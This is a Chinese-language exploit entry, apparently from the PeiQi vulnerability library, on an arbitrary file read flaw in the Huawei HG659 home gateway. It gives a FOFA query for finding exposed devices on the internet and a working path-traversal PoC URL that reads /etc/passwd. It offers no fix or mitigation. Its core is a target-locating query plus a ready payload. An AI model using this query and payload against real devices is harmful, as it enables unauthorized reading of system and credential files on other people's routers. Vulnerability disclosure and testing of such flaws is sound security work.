---
title: Huawei HG659 lib 任意文件读取漏洞
date: 2021-09-23 23:55:51
tags: PeiQi文库
categories:
 - 网络设备漏洞
 - 华为
---

# Huawei HG659 lib 任意文件读取漏洞

## 漏洞描述

Huawei HG659 lib 存在任意文件读取漏洞，攻击者通过漏洞可以读取任意文件

## 漏洞影响

> [!NOTE]
>
> Huawei HG659 

## FOFA

> [!NOTE]
>
> app="HUAWEI-Home-Gateway-HG659"

## 漏洞复现

登录页面如下

![image-20210615141459903](/img/20210924020226248687.png)

POC如下

```
/lib///....//....//....//....//....//....//....//....//etc//passwd
```

![image-20210615141751249](/img/20210924020226495764.png)